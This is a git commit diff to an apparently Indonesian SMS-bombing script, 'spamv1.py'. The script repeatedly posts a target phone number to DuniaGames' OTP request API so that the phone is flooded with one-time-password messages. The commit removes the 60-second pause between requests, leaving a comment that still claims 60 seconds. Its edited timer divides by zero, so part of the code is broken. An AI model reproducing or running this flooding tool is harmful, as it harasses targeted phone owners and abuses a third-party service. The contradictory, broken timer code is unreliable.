2350fbf227d61a21a0ff9bbd64fb0c043f987b6f
CYBER-MODZ <92875143+CYBER-MODZ@users.noreply.github.com>
2021-10-20 23:46:51 +0700

    Spamv1.py

--- spamv1.py
+++ spamv1.py
@@ -69,13 +69,14 @@ def anjay_alok():
     print (" ║  \033[31m\033[31m███████\033[1;33m║\033[31m██\033[1;33m║  \033[31m   ██\033[1;33m║\033[31m  ██\033[1;33m║\033[31m██\033[1;33m║ ╚═╝ \033[31m██\033[1;33m║    \033[1;36m    ║")
     print (" ║  \033[1;33m╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝     ╚═╝ \033[1;30m[\033[1;33mSMS\033[1;30m]  \033[1;36m║")
     print (" \033[1;36m║\033[1;33m---------------------------------------------\033[1;36m║")
-    print (" \033[1;36m║\033[1;33m ➤ \033[1;37mAuthor \033[1;33m: \033[1;37mCyber-Modz                          \033[1;36m║")
+    print (" \033[1;36m║\033[1;33m ➤ \033[1;37mAuthor \033[1;33m: \033[1;37mCYBER-MODZ                          \033[1;36m║")
     print (" \033[1;36m║ \033[1;33m➤ \033[1;37mSpam Method \033[1;33m: \033[1;37mPOST                        \033[1;36m║")
     print (" \033[1;36m╚═════════════════════════════════════════════╝")
     print (" \033[1;30m<════════════[ \033[1;33m• INFORMATION \033[1;33m• \033[1;30m]══════════════>")
     print ("  \033[1;36m➤ \033[1;37mStatus Code \033[1;33m: \033[1;37mOPEN SOURCE \033[1;37m/ NOT ENCRYPTED")
-    print ("  \033[1;36m➤ \033[1;37mApi Source \033[1;33m: \033[1;37mDuniaGames.co.id",
+    print ("  \033[1;36m➤ \033[1;37mApi Source \033[1;33m: \033[1;37mDuniaGames.co.id")
     print ("  \033[1;36m➤ \033[1;37minquiryId \033[1;33m: \033[1;37m"+inquiryId)
+    print ("  \033[1;36m➤ \033[1;37mYoutube \033[1;33m: \033[1;37mMr_Dark")
     print (" \033[1;30m<═════════════════════════════════════════════>")
     print ("          \033[1;30m --=[ \033[1;33m• \033[1;37mTarget Phone \033[1;30m\033[1;33m• \033[1;30m]=--")
     print ("")
@@ -107,11 +108,11 @@ dark={
 "phoneNumber":mr_dark1,
 "inquiryId":inquiryId
 }
-# timer untuk per 1 spam adalah 1 second
+# timer untuk per 1 spam adalah 60 second
 def countdownTimer(start_minute, start_second):
-    total_second = start_minute * 1 + start_second
+    total_second = start_minute * 00 + start_second
     while total_second:
-        mins, secs = divmod(total_second, 1)
+        mins, secs = divmod(total_second, 00)
         print(f'  \033[1;33m➤ \033[1;37mwaiting (\033[1;32m{secs:02d}\033[1;37m)', end='\r')
         time.sleep(1)
         total_second -= 1
@@ -121,5 +122,5 @@ if __name__ == '__main__':
     for i in range(int(jumlah)):
         darko=requests.post('https://api.duniagames.co.id/api/transaction/v1/top-up/transaction/req-otp/',headers=mr_f,json=dark).text
         print (f'  \033[31m➤ \033[1;37mTerkirim                            ')
-        countdownTimer(00, 60)
+        countdownTimer(00, 00)
         subs_mr_dark += 1
